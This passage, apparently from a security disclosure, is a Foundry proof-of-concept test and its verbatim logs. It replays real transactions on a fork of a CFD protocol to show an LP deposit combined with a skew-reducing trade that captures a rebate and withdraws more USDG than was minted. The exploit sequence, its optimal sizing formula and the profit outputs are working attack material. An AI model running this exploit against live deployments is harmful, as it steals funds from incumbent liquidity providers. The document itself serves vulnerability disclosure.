            uint256 maxSkewRatio,
            uint256 maint,
            uint256 init_,
            uint256 fad,
            uint256 baseCarryBps,
            uint256 minBounty,
            uint256 bountyBps,
            uint256 keeperShareBps,
            uint256 protocolShareBps
        ) = engine.riskParams();
        assertEq(vpiFactor, 0.01e18, "vpiFactor");
        assertEq(maxSkewRatio, 0.4e18, "maxSkewRatio");
        assertEq(maint, 10, "maintMarginBps");
        assertEq(init_, 20, "initMarginBps");
        assertEq(fad, 300, "fadMarginBps");
        assertEq(baseCarryBps, 500, "baseCarryBps");
        assertEq(minBounty, 1e6, "minBountyAssets");
        assertEq(bountyBps, 10, "bountyBps");
        assertEq(keeperShareBps, 5000, "keeperShareBps");
        assertEq(protocolShareBps, 0, "protocolShareBps");
        assertEq(oracle.basketMaxConfidenceRatioBps(), 10, "basketMaxConfidenceRatioBps");
        assertEq(oracle.adverseConfidenceMultiplierBps(), 2500, "adverseConfidenceMultiplierBps");
        assertEq(router.minOpenNotionalAssets(), 1000e6, "minOpenNotionalAssets");
        assertEq(router.maxPendingOrders(), 5, "maxPendingOrders");
        assertEq(pool.maxSeniorExposureAssets(), 40_000_000e6, "maxSeniorExposureAssets");
        assertEq(pool.maxSeniorShareBps(), 8000, "maxSeniorShareBps");
        assertEq(engine.settlementBufferBps(), 25, "settlementBufferBps");
        assertEq(junior.maintenanceFeeAprBps(), 0, "juniorMaintenanceFeeAprBps (disabled at deployment)");
        assertEq(IVault(SENIOR).maintenanceFeeAprBps(), 0, "Senior maintenance fee (zero at deployment)");
        assertFalse(pool.lpEpochSettlementPaused(), "no LP settlement hold");
        assertFalse(engine.isFadWindow(), "live market: not FAD");
        assertFalse(engine.isOracleFrozen(), "live market: not frozen");
    }

    // ================================================================== the PoC

    /// @notice Headline: the attack alone, with every system log of the attacker's steps dumped raw.
    function test_attack_depositThenSkewReducingOpenClose() public {
        _printState("fork block 326504738, Fri 2026-11-06 03:50:00 UTC");
        Out memory a = _scenario(true, true, true, "ATTACK: Junior deposit + skew-reducing SHORT open/close");
        console2.log("real transactions replayed", replayed);
        console2.log("replays whose event-signature sequence differs from the real receipt", receiptTopicMismatches);

        // System facts: the pool paid the rebate in cash at open, the reserve equals the rebate, it was still outstanding
        // when the real LP epoch keeper priced the deposit, and the clamp took it back at close.
        assertGt(a.poolAssetsBeforeOpen, a.poolAssetsAfterOpen, "pool assets fall at the skew-reducing open");
        assertGt(a.reserveAtOpen, 0, "VPI rebate reserve locked at open");
        assertEq(int256(a.reserveAtOpen), -a.vpiAccruedAtOpen, "reserve == -lifetime VPI");
        assertEq(a.reserveAtSettlement, a.reserveAtOpen, "whole reserve outstanding when the keeper settles the epoch");
        assertEq(a.reserveAfterClose, 0, "close consumes the whole reserve");
        assertGt(a.poolAssetsAfterClose, a.poolAssetsBeforeClose, "pool assets rise at close");
        assertLt(a.juniorAssetsAfterOpen, a.juniorAssetsBeforeOpen, "Junior NAV falls at open");
        assertGt(a.juniorAssetsAfterClose, a.juniorPrincipalAfterActivation, "Junior NAV recovers at close");
        // Impact: the attacker withdraws more USDG to its own wallet than it ever put in.
        assertEq(a.redeemedAssets > 0, true, "redemption claimed to the attacker wallet");
        assertGt(a.attackerProfit, 0, "attacker wallet ends above everything it minted");
        console2.log("IMPACT Critical - Direct theft of user funds: USDG withdrawn to the attacker's wallets above all USDG it minted");
        console2.logInt(a.attackerProfit);
    }

    /// @notice Same window, four scenarios from one fork snapshot: the attack, a deposit-only control (same deposit,
    ///         same settlement times, no trade), a trade-only control (same SHORT, no deposit) and a baseline. The real
    ///         price path and every real transaction are identical in all four, so differences are the mechanism.
    function test_attackVsControls_samePath() public {
        startSnapshot = vm.snapshotState();
        Out memory atk = _scenario(true, true, false, "ATTACK: deposit + skew-reducing SHORT open/close");
        uint256 r1 = replayed;
        vm.revertToState(startSnapshot);
        _resetReplay();
        Out memory dep = _scenario(true, false, false, "CONTROL A: deposit only (same deposit, same settlements)");
        vm.revertToState(startSnapshot);
        _resetReplay();
        Out memory trd = _scenario(false, true, false, "CONTROL B: SHORT open/close only, no deposit");
        vm.revertToState(startSnapshot);
        _resetReplay();
        Out memory base = _scenario(false, false, false, "BASELINE: neither");
        console2.log("real transactions replayed per scenario", r1);
        console2.log("replays whose event-signature sequence differs (all scenarios)", receiptTopicMismatches);

        console2.log("===== comparison (USDG atoms, 6 decimals)");
        console2.log("attacker profit: attack / deposit-only / trade-only / baseline");
        console2.logInt(atk.attackerProfit);
        console2.logInt(dep.attackerProfit);
        console2.logInt(trd.attackerProfit);
        console2.logInt(base.attackerProfit);
        int256 attackerInteraction = atk.attackerProfit - dep.attackerProfit - trd.attackerProfit + base.attackerProfit;
        console2.log("IMPACT attacker gain from combining deposit and trade (attack - A - B + baseline)");
        console2.logInt(attackerInteraction);
        int256 incAtk = int256(atk.incumbentValueEnd);
        int256 incInteraction = incAtk - int256(dep.incumbentValueEnd) - int256(trd.incumbentValueEnd)
            + int256(base.incumbentValueEnd);
        console2.log("incumbent Junior value at 06:00:21: attack / deposit-only / trade-only / baseline");
        console2.log(atk.incumbentValueEnd, dep.incumbentValueEnd);
        console2.log(trd.incumbentValueEnd, base.incumbentValueEnd);
        console2.log("IMPACT incumbent Junior value change from combining deposit and trade");
        console2.logInt(incInteraction);
        console2.log("IMPACT incumbent Junior value, attack minus deposit-only control");
        console2.logInt(incAtk - int256(dep.incumbentValueEnd));
        console2.log("treasury at end: attack / deposit-only / trade-only / baseline");
        console2.log(atk.treasuryEnd, dep.treasuryEnd);
        console2.log(trd.treasuryEnd, base.treasuryEnd);

        assertEq(atk.shortSize, trd.shortSize, "control B trades the same SHORT as the attack");
        assertGt(atk.attackerProfit, 0, "attack: attacker wallet ends above everything it minted");
        assertGt(atk.attackerProfit, dep.attackerProfit, "attack beats an honest depositor on the same path");
        assertLt(trd.attackerProfit, 0, "the trade alone loses (fees): the deposit is what monetizes the rebate");
        assertGt(attackerInteraction, 0, "gain comes from combining deposit and trade");
        assertLt(atk.incumbentValueEnd, dep.incumbentValueEnd, "incumbent worse off than with an honest depositor");
        assertLt(incInteraction, 0, "incumbent pays the interaction");
    }

    // ================================================================== one scenario over the real window

    function _scenario(
        bool doDeposit,
        bool doTrade,
        bool dump,
        string memory tag
    ) internal returns (Out memory o) {
        console2.log("=====", tag);
        // 03:50:05 (03:00 epoch, before the 03:55 cutoff): fund from the public testnet faucet and request the Junior
        // deposit. It matures at 04:00:00.
        _replayThrough(DEPOSIT_TS - 1);
        _at(DEPOSIT_TS);
        uint256 depReq;
        if (doDeposit) {
            if (dump) vm.recordLogs();
            vm.startPrank(ATTACKER);
            usdg.mint(ATTACKER, DEPOSIT);
            usdg.approve(JUNIOR, DEPOSIT);
            depReq = junior.requestDeposit(DEPOSIT, ATTACKER, ATTACKER);
            vm.stopPrank();
            if (dump) _dumpLogs("03:50:05 attacker: mint + approve + requestDeposit (Junior)", vm.getRecordedLogs());
        }

        // 03:59:29: size the SHORT from system reads, post trader collateral, and commit the skew-reducing SHORT one
        // second before the 03:59:30 Pyth publication (the last real tick before the hour).
        uint64 openId;
        uint256 collateral;
        _replayThrough(TICK_OPEN_PUBLISH - 2);
        _at(TICK_OPEN_PUBLISH - 1);
        o.shortSize = _attackSize();
        o.shortNotional = (o.shortSize * engine.lastMarkPrice()) / 1e20;
        if (doTrade) {
            collateral = o.shortNotional / 20; // 5% of notional: margin 2% plus fees and reserves, all withdrawn later
            if (dump) vm.recordLogs();
            vm.startPrank(ATTACKER);
            usdg.mint(ATTACKER, collateral);
            usdg.approve(CLEARINGHOUSE, collateral);
            clearinghouse.deposit(ATTACKER, collateral);
            vm.stopPrank();
            openId = _commit(CfdTypes.Side.SHORT, o.shortSize, o.shortNotional / 50, false);
            if (dump) {
                _dumpLogs(
                    "03:59:29 attacker: mint + clearinghouse deposit + commitOrder(open SHORT)", vm.getRecordedLogs()
                );
            }
        }
        o.minted = collateral + (doDeposit ? DEPOSIT : 0);

        // 03:59:33: the real keeper tick lands; the attacker's keeper fills the open with that tick's signed payload.
        // The pool pays the VPI rebate out of LP cash.
        _replayThrough(TICK_OPEN_TS);
        _clock(TICK_OPEN_BLOCK, TICK_OPEN_TS);
        o.poolAssetsBeforeOpen = pool.totalAssets();
        o.juniorAssetsBeforeOpen = junior.totalAssets();
        if (doTrade) {
            bytes[] memory payloadOpen = this.decodeUpdateMarkPrice(_tickOpenInput());
            uint256 feeOpen = oracle.getUpdateFee(payloadOpen); // quoted before the prank so the prank applies to the call
            if (dump) vm.recordLogs();
            vm.prank(A_KEEPER);
            OrderV3Types.ExecutionResult memory r = router.executeOrder{value: feeOpen}(openId, payloadOpen);
            if (dump) _dumpLogs("03:59:33 attacker keeper: executeOrder(open SHORT)", vm.getRecordedLogs());
            assertEq(uint8(r.terminalReason), uint8(OrderV3Types.TerminalReason.Executed), "open filled");
            assertGt(clearinghouse.balanceAssets(A_KEEPER), 0, "execution bounty credited to the attacker's keeper");
            (,,,,,, o.vpiAccruedAtOpen) = engine.positions(ATTACKER);
            o.reserveAtOpen = clearinghouse.vpiRebateReserveAssets(ATTACKER);
        }
        o.poolAssetsAfterOpen = pool.totalAssets();
        o.juniorAssetsAfterOpen = junior.totalAssets();

        // 04:00:07: the real keeper tick carries the first 04:00-epoch basket. 04:00:12: the deployment's real LP epoch
        // keeper settles the matured 04:00 epoch with it, as it did 12-15 s after the hour for every epoch with a pending
        // LP request since deployment (and for none without one). The attacker's request is the only LP request in the
        // window (provenance/fri-0100-0800.logs.json), so the keeper acts exactly when doDeposit is set. The deposit is
        // priced with the rebate reserve still outstanding.
        _replayThrough(SETTLE_TS - 1);
        _at(SETTLE_TS);
        o.reserveAtSettlement = clearinghouse.vpiRebateReserveAssets(ATTACKER);
        if (doDeposit) {
            _lpEpochKeeperSettles(_tickSettleInput(), dump, "04:00:12 real LP epoch keeper: settleLpEpoch (deposit activation)");
            uint256 claimable = junior.claimableDepositRequest(depReq, ATTACKER);
            if (dump) vm.recordLogs();
            vm.prank(ATTACKER);
            o.sharesMinted = junior.claimDeposit(depReq, claimable, ATTACKER, ATTACKER);
            if (dump) _dumpLogs("04:00:12 attacker: claimDeposit", vm.getRecordedLogs());
        }
        o.juniorPrincipalAfterActivation = junior.totalAssets();

        // 04:00:35: commit the full close one second before the 04:00:36 publication; 04:00:42: fill it on that tick. The
        // lifetime-VPI clamp returns the whole reserve to the pool. Then withdraw the trader collateral.
        if (doTrade) {
            _replayThrough(TICK_CLOSE_PUBLISH - 2);
            _at(TICK_CLOSE_PUBLISH - 1);
            if (dump) vm.recordLogs();
            uint64 closeId = _commit(CfdTypes.Side.SHORT, o.shortSize, 0, true);
            if (dump) _dumpLogs("04:00:35 attacker: commitOrder(close SHORT)", vm.getRecordedLogs());
            _replayThrough(TICK_CLOSE_TS);
            _clock(TICK_CLOSE_BLOCK, TICK_CLOSE_TS);
            bytes[] memory payloadClose = this.decodeUpdateMarkPrice(_tickCloseInput());
            o.poolAssetsBeforeClose = pool.totalAssets();
            o.reserveBeforeClose = clearinghouse.vpiRebateReserveAssets(ATTACKER);
            uint256 feeClose = oracle.getUpdateFee(payloadClose);
            if (dump) vm.recordLogs();
            vm.prank(A_KEEPER);
            OrderV3Types.ExecutionResult memory r = router.executeOrder{value: feeClose}(closeId, payloadClose);
            if (dump) _dumpLogs("04:00:42 attacker keeper: executeOrder(close SHORT)", vm.getRecordedLogs());
            assertEq(uint8(r.terminalReason), uint8(OrderV3Types.TerminalReason.Executed), "close filled");
            assertEq(_size(ATTACKER), 0, "position closed");
            o.poolAssetsAfterClose = pool.totalAssets();
            o.reserveAfterClose = clearinghouse.vpiRebateReserveAssets(ATTACKER);
            if (dump) vm.recordLogs();
            _withdrawAll(ATTACKER);
            if (dump) _dumpLogs("04:00:42 attacker: clearinghouse withdraw (trader collateral)", vm.getRecordedLogs());
        }
        o.juniorAssetsAfterClose = junior.totalAssets();

        // 05:00:14: request redemption of every share at the first second the deposit cooldown allows.
        uint256 redReq;
        _replayThrough(REDEEM_TS - 1);
        _at(REDEEM_TS);
        if (doDeposit) {
            uint256 shares = junior.maxRequestRedeem(ATTACKER);
            if (dump) vm.recordLogs();
            vm.prank(ATTACKER);
            redReq = junior.requestRedeem(shares, ATTACKER, ATTACKER);
            if (dump) _dumpLogs("05:00:14 attacker: requestRedeem (all shares)", vm.getRecordedLogs());
        }
        // 06:00:21: first real tick carrying a 06:00-epoch basket. The real LP epoch keeper settles the matured
        // redemption on it, and the attacker claims the USDG to its own wallet.
        _replayThrough(TICK_REDEEM_TS);
        _clock(TICK_REDEEM_BLOCK, TICK_REDEEM_TS);
        if (doDeposit) {
            _lpEpochKeeperSettles(_tickRedeemInput(), dump, "06:00:21 real LP epoch keeper: settleLpEpoch (redemption funding)");
            uint256 claimShares = junior.claimableRedeemRequest(redReq, ATTACKER);
            if (dump) vm.recordLogs();
            vm.prank(ATTACKER);
            o.redeemedAssets = junior.claimRedeem(redReq, claimShares, ATTACKER, ATTACKER);
            if (dump) _dumpLogs("06:00:21 attacker: claimRedeem (to attacker wallet)", vm.getRecordedLogs());
            assertEq(junior.balanceOf(ATTACKER), 0, "attacker holds no Junior shares");
        }
        if (dump) vm.recordLogs();
        _withdrawAll(ATTACKER);
        _withdrawAll(A_KEEPER);
        if (dump) _dumpLogs("06:00:21 attacker + attacker keeper: clearinghouse withdraw (remaining balances)", vm.getRecordedLogs());

        // End-of-window reads, all from the deployed contracts.
        o.attackerWalletEnd = usdg.balanceOf(ATTACKER) + usdg.balanceOf(A_KEEPER);
        assertEq(clearinghouse.balanceAssets(ATTACKER), 0, "attacker clearinghouse balance withdrawn");
        assertEq(clearinghouse.balanceAssets(A_KEEPER), 0, "attacker keeper clearinghouse balance withdrawn");
        o.attackerProfit = int256(o.attackerWalletEnd) - int256(o.minted);
        o.incumbentValueEnd = junior.convertToAssets(incumbentShares);
        o.incumbentLpValueEnd = junior.convertToAssets(junior.balanceOf(INCUMBENT_LP));
        o.juniorPrincipalEnd = pool.juniorPrincipal();
        o.seniorPrincipalEnd = pool.seniorPrincipal();
        address treasury = engine.protocolTreasury();
        o.treasuryEnd = clearinghouse.balanceAssets(treasury) + usdg.balanceOf(treasury);
        o.markEnd = engine.lastMarkPrice();
        _log(o, doDeposit, doTrade);
    }

    /// @dev The deployment's real LP epoch keeper sends OrderRouter.settleLpEpoch(bytes[]) (the documented
    ///      AtomicOracleRefresh route for live open-position settlement) from its own address, as msg.sender and
    ///      tx.origin, with a real signed basket of the new epoch. Its three real settlements sent 0 ETH (the deployed
    ///      oracle quotes a 0 Pyth fee); the quoted fee is asserted to be 0 so the keeper needs no ETH from the harness.
    function _lpEpochKeeperSettles(
        bytes memory tickInput,
        bool dump,
        string memory step
    ) internal {
        bytes[] memory payload = this.decodeUpdateMarkPrice(tickInput);
        uint256 fee = oracle.getUpdateFee(payload);
        assertEq(fee, 0, "deployed oracle quotes a zero Pyth fee, as in the keeper's real settlements");
        if (dump) vm.recordLogs();
        vm.prank(LP_EPOCH_KEEPER, LP_EPOCH_KEEPER);
        router.settleLpEpoch{value: fee}(payload);
        if (dump) _dumpLogs(step, vm.getRecordedLogs());
    }

    /// @dev Attacker sizing, mechanical and read from the deployed contracts at commit-planning time: reduce the net
    ///      third-party skew S0 by the fraction f* = 1 - (2 * fee / k) * D * (J + X) / (X * S0) that maximizes
    ///      c * R(f) - fees(f) for R(f) = k * S0^2 / (2D) * (2f - f^2), c = X / (J + X) (finding.md "Ceiling at release").
    function _attackSize() internal view returns (uint256 size) {
        (, uint256 longOI,,) = engine.sides(0);
        (, uint256 shortOI,,) = engine.sides(1);
        require(longOI > shortOI, "book must be net LONG for a SHORT to reduce skew");
        uint256 net = longOI - shortOI;
        uint256 s0 = (net * engine.lastMarkPrice()) / 1e20;
        uint256 d = pool.totalAssets();
        uint256 j = junior.totalAssets();
        (uint256 k,,,,,,,,,) = engine.riskParams();
        uint256 ratio = ((2 * engine.executionFeeBps() * 1e18) / 10_000) * 1e18 / k; // 0.08e18
        uint256 sub = (((ratio * d) / s0) * (j + DEPOSIT)) / DEPOSIT;
        require(sub < 1e18, "no profitable size at this skew");
        uint256 f = 1e18 - sub;
        size = ((net * f) / 1e18 / CfdTypes.SIZE_QUANTUM) * CfdTypes.SIZE_QUANTUM;
    }

    // ================================================================== real-transaction replay

    function _resetReplay() internal {
        cursor = 0;
        attackerCommits = 0;
        lastBlock = FORK_BLOCK;
        lastTs = FORK_TS;
        _setArbBlock(FORK_BLOCK);
    }

    function _replayThrough(
        uint256 ts
    ) internal {
        while (cursor < replay.length && replay[cursor].timestamp <= ts) {
            Rtx memory r = replay[cursor];
            ++cursor;
            _clock(r.blockNumber, r.timestamp);
            vm.recordLogs();
            if (r.kind == 2) {
                vm.transact(r.hash);
                assertEq(engine.lastMarkTime(), r.markTime, "keeper tick: real post-block mark time");
                assertEq(engine.lastMarkPrice(), r.markPrice, "keeper tick: real post-block mark price");
            } else {
                _resend(r.hash, r.kind == 1);
            }
            _compareReceiptTopics(r);
            ++replayed;
        }
    }

    /// @dev Re-sends a real transaction from its real sender (msg.sender and tx.origin) with its real value and calldata.
    ///      For owner executeOrder the order id is shifted past the attacker's commits and checked to be the same real
    ///      order (isClose, side and size of the real pending order).
    function _resend(
        bytes32 txHash,
        bool shiftOrderId
    ) internal {
        (address from, address to, uint256 value, bytes memory data, bool isClose, uint8 side, uint256 size) =
            _txInput(txHash);
        if (shiftOrderId) {
            uint256 realId;
            assembly ("memory-safe") {
                realId := mload(add(data, 36))
            }
            uint256 forkId = realId + attackerCommits;
            assembly ("memory-safe") {
                mstore(add(data, 36), forkId)
            }
            (IOrderRouterAccounting.PendingOrderView memory pending,) = router.getPendingOrderView(uint64(forkId));
            assertEq(pending.isClose, isClose, "same real order: isClose");
            assertEq(uint8(pending.side), side, "same real order: side");
            assertEq(pending.sizeDelta, size, "same real order: size");
        }
        vm.prank(from, from);
        (bool ok, bytes memory ret) = to.call{value: value}(data);
        if (!ok) {
            console2.log("real transaction reverted on the fork:");
            console2.logBytes32(txHash);
            console2.logBytes(ret);
            revert("replay of a real transaction reverted");
        }
        if (shiftOrderId) {
            OrderV3Types.ExecutionResult memory res = abi.decode(ret, (OrderV3Types.ExecutionResult));
            assertEq(uint8(res.terminalReason), uint8(OrderV3Types.TerminalReason.Executed), "real order executed");
        }
    }

    function _compareReceiptTopics(
        Rtx memory r
    ) internal {
        Vm.Log[] memory logs = vm.getRecordedLogs();
        bytes memory packed;
        for (uint256 i; i < logs.length; ++i) {
            packed = abi.encodePacked(packed, logs[i].topics.length == 0 ? bytes32(0) : logs[i].topics[0]);
        }
        if (keccak256(packed) != r.receiptTopicsHash) {
            ++receiptTopicMismatches;
            console2.log("replay emitted a different event-signature sequence than the real receipt:");
            console2.logBytes32(r.hash);
        }
    }

    // ================================================================== attacker helpers

    function _commit(
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal returns (uint64 orderId) {
        OrderV3Types.OrderRequest memory request;
        request.clientOrderId = keccak256(abi.encode("negative-vpi-rebate-deposit-mirror", ATTACKER, attackerCommits));
        request.side = side;
        request.sizeDelta = size;
        request.marginDelta = margin;
        request.targetPrice = (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1;
        request.isClose = isClose;
        uint64 window = uint64(router.maxExecutionWindowSeconds());
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(block.timestamp) + window,
            executionWindowSeconds: uint32(window),
            allowedExecutionModes: 7,
            expectedConfigHash: IBook(LIFECYCLE_BOOK).currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
        vm.prank(ATTACKER);
        orderId = router.commitOrder(request);
        ++attackerCommits;
    }

    function _withdrawAll(
        address account
    ) internal {
        uint256 free = clearinghouse.getFreeBuyingPowerAssets(account);
        if (free != 0) {
            vm.prank(account);
            clearinghouse.withdraw(account, free);
        }
    }

    // ================================================================== clock and views

    /// @dev Our own transactions get a block number interpolated between the surrounding real replay anchors.
    function _at(
        uint256 ts
    ) internal {
        uint256 bn = lastBlock;
        if (ts > lastTs) {
            uint256 nextBlock = cursor < replay.length ? replay[cursor].blockNumber : lastBlock + (ts - lastTs) * 4;
            uint256 nextTs = cursor < replay.length ? replay[cursor].timestamp : ts;
            bn = nextTs > lastTs ? lastBlock + ((nextBlock - lastBlock) * (ts - lastTs)) / (nextTs - lastTs) : lastBlock;
            if (bn <= lastBlock) {
                bn = lastBlock + 1;
            }
        }
        _clock(bn, ts);
    }

    function _clock(
        uint256 bn,
        uint256 ts
    ) internal {
        if (bn < lastBlock) {
            bn = lastBlock;
        }
        vm.roll(bn);
        vm.warp(ts);
        _setArbBlock(bn);
        lastBlock = bn;
        lastTs = ts;
    }

    /// @dev Forge's built-in ArbSys shim returns the fork block forever; the protocol's same-block ordering checks
    ///      (ExecutionBlockNumberLib) need the real L2 block number, which is what ArbSys returns on chain.
    function _setArbBlock(
        uint256 bn
    ) internal {
        vm.mockCall(address(100), abi.encodeWithSelector(IArbSysBlockNumber.arbBlockNumber.selector), abi.encode(bn));
    }

    function _size(
        address account
    ) internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(account);
    }

    function decodeUpdateMarkPrice(
        bytes calldata input
    ) external pure returns (bytes[] memory) {
        return abi.decode(input[4:], (bytes[]));
    }

    // ================================================================== output

    function _printState(
        string memory tag
    ) internal view {
        (, uint256 longOI,,) = engine.sides(0);
        (, uint256 shortOI,,) = engine.sides(1);
        console2.log("=====", tag);
        console2.log("engine.lastMarkPrice / lastMarkTime", engine.lastMarkPrice(), engine.lastMarkTime());
        console2.log("engine.sides(LONG).openInterest / sides(SHORT).openInterest", longOI, shortOI);
        console2.log("pool.totalAssets / juniorPrincipal / seniorPrincipal", pool.totalAssets(), pool.juniorPrincipal());
        console2.log("  seniorPrincipal", pool.seniorPrincipal());
        console2.log("junior.totalSupply / totalAssets", junior.totalSupply(), junior.totalAssets());
        console2.log("incumbent LP 0x5a71...0d6B junior shares", junior.balanceOf(INCUMBENT_LP));
    }

    function _dumpLogs(
        string memory step,
        Vm.Log[] memory logs
    ) internal pure {
        console2.log("raw system logs of", step, logs.length);
        for (uint256 i; i < logs.length; ++i) {
            console2.log("log", i, logs[i].emitter);
            for (uint256 k; k < logs[i].topics.length; ++k) {
                console2.logBytes32(logs[i].topics[k]);
            }
            console2.logBytes(logs[i].data);
        }
    }

    function _log(
        Out memory o,
        bool doDeposit,
        bool doTrade
    ) internal pure {
        console2.log("  USDG minted by the attacker (faucet)", o.minted);
        if (doTrade) {
            console2.log("  SHORT size (18 dec) / notional at commit", o.shortSize, o.shortNotional);
            console2.log("  pool.totalAssets before / after open", o.poolAssetsBeforeOpen, o.poolAssetsAfterOpen);
            console2.log("  engine.positions.vpiAccrued at open (signed)");
            console2.logInt(o.vpiAccruedAtOpen);
            console2.log("  clearinghouse.vpiRebateReserveAssets at open", o.reserveAtOpen);
            console2.log("  reserve when the LP epoch keeper settles (04:00:12)", o.reserveAtSettlement);
            console2.log("  reserve before / after close", o.reserveBeforeClose, o.reserveAfterClose);
            console2.log("  pool.totalAssets before / after close", o.poolAssetsBeforeClose, o.poolAssetsAfterClose);
        }
        console2.log("  junior.totalAssets before / after open", o.juniorAssetsBeforeOpen, o.juniorAssetsAfterOpen);
        console2.log("  junior.totalAssets after activation / after close", o.juniorPrincipalAfterActivation, o.juniorAssetsAfterClose);
        if (doDeposit) {
            console2.log("  junior shares minted to attacker / USDG redeemed to wallet", o.sharesMinted, o.redeemedAssets);
        }
        console2.log("  attacker USDG wallet at end (balanceOf attacker + attacker keeper)", o.attackerWalletEnd);
        console2.log("  IMPACT attacker profit = wallet at end - USDG minted");
        console2.logInt(o.attackerProfit);
        console2.log("  incumbent Junior shares value at end (convertToAssets)", o.incumbentValueEnd);
        console2.log("  incumbent LP 0x5a71...0d6B value at end", o.incumbentLpValueEnd);
        console2.log("  pool.juniorPrincipal / seniorPrincipal at end", o.juniorPrincipalEnd, o.seniorPrincipalEnd);
        console2.log("  treasury (clearinghouse + wallet) at end", o.treasuryEnd);
        console2.log("  engine.lastMarkPrice at end", o.markEnd);
    }

}
```

### Output

`forge-test-vv.log` from the command above, headline test (lines 791 and 1274-1299), verbatim:

```
[PASS] test_attack_depositThenSkewReducingOpenClose() (gas: 40149921)
    USDG minted by the attacker (faucet) 96149904854584
    SHORT size (18 dec) / notional at commit 23804500000000000000000000 22998097091685
    pool.totalAssets before / after open 102231237453802 102167406477632
    engine.positions.vpiAccrued at open (signed)
  -63830976170
    clearinghouse.vpiRebateReserveAssets at open 63830976170
    reserve when the LP epoch keeper settles (04:00:12) 63830976170
    reserve before / after close 63830976170 0
    pool.totalAssets before / after close 197167406945565 197230377422381
    junior.totalAssets before / after open 101018065265147 100954399254162
    junior.totalAssets after activation / after close 195955141836785 196019286355838
    junior shares minted to attacker / USDG redeemed to wallet 94787343818440629 95026662364267
    attacker USDG wallet at end (balanceOf attacker + attacker keeper) 96159028449905
    IMPACT attacker profit = wallet at end - USDG minted
  9123595321
    incumbent Junior shares value at end (convertToAssets) 100983475550115
    incumbent LP 0x5a71...0d6B value at end 100973479865748
    pool.juniorPrincipal / seniorPrincipal at end 100983475550116 1112001239595
    treasury (clearinghouse + wallet) at end 78858442141
    engine.lastMarkPrice at end 96594578
  real transactions replayed 247
  replays whose event-signature sequence differs from the real receipt 0
  IMPACT Critical - Direct theft of user funds: USDG withdrawn to the attacker's wallets above all USDG it minted
  9123595321

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 170.87s (213.69s CPU time)
```

Same log, controls test (lines 702 and 770-789), verbatim. All four scenarios replay the same 247 real transactions from one fork snapshot:

```
[PASS] test_attackVsControls_samePath() (gas: 133016687)
  real transactions replayed per scenario 247
  replays whose event-signature sequence differs (all scenarios) 0
  ===== comparison (USDG atoms, 6 decimals)
  attacker profit: attack / deposit-only / trade-only / baseline
  9123595321
  -4275570546
  -17583560931
  0
  IMPACT attacker gain from combining deposit and trade (attack - A - B + baseline)
  30982726798
  incumbent Junior value at 06:00:21: attack / deposit-only / trade-only / baseline
  100983475550115 101015273516510
  101010179638724 101010994878058
  IMPACT incumbent Junior value change from combining deposit and trade
  -30982727061
  IMPACT incumbent Junior value, attack minus deposit-only control
  -31797966395
  treasury at end: attack / deposit-only / trade-only / baseline
  78858442141 60459641774
  78858442141 60459641774
```

`forge-test-vvvv.log`, forge's decoded trace of the headline test, verbatim, with the line number first. These are every USDG transfer into or out of the attacker's two wallets, the rebate leaving and coming back, both settlements by the LP epoch keeper `0xC60408d3f42A7Aa49889bc94BA6a74b9801b7BDA`, and the final USDG balances:

```
703:    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], amount: 95000000000000 [9.5e13])
880:    │   │   ├─ emit Transfer(from: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], to: 0x4A8b67184a1E3224c11A191cc69F22C50EEf734e, amount: 95000000000000 [9.5e13])
891:    │   ├─ emit DepositRequested(caller: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], controller: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], epochId: 498316 [4.983e5], assets: 95000000000000 [9.5e13])
2382:    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], amount: 1149904854584 [1.149e12])
2389:    │   │   ├─ emit Transfer(from: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], to: 0xB5B851f627d6Df3CF3F096E23e20a58884D7b89A, amount: 1149904854584 [1.149e12])
3465:    │   │   │   │   │   │   ├─ [14956] 0xeB5604c393843B2f3c347Ec24Fa9dDaD6Ab2131e::payOut(0xB5B851f627d6Df3CF3F096E23e20a58884D7b89A, 54631748093 [5.463e10])
3481:    │   │   │   │   │   │   ├─ [28399] 0xB5B851f627d6Df3CF3F096E23e20a58884D7b89A::lockVpiRebateReserve(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], 63830976170 [6.383e10])
3518:    │   │   │   │   │   │   ├─ [4556] 0xeB5604c393843B2f3c347Ec24Fa9dDaD6Ab2131e::payOut(0xB5B851f627d6Df3CF3F096E23e20a58884D7b89A, 9199228077 [9.199e9])
3565:    │   │   │   │   │   ├─ emit PositionOpened(account: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], side: 1, sizeDelta: 23804500000000000000000000 [2.38e25], price: 96612280 [9.661e7], marginDelta: 459961941833 [4.599e11])
4003:    ├─ [0] VM::prank(0xC60408d3f42A7Aa49889bc94BA6a74b9801b7BDA, 0xC60408d3f42A7Aa49889bc94BA6a74b9801b7BDA)
4071:    │   │   ├─ [502602] 0xeB5604c393843B2f3c347Ec24Fa9dDaD6Ab2131e::settleLpEpoch(96615839 [9.661e7], 1793937603 [1.793e9])
4175:    │   │   │   ├─ emit LpEpochSettled(cutoffEpoch: 498316 [4.983e5], seniorRedeemAssets: 0, juniorRedeemAssets: 0, juniorDepositAssets: 95000000000000 [9.5e13], seniorDepositAssets: 0, seniorBacklog: false, juniorBacklog: false, entriesDeferred: false)
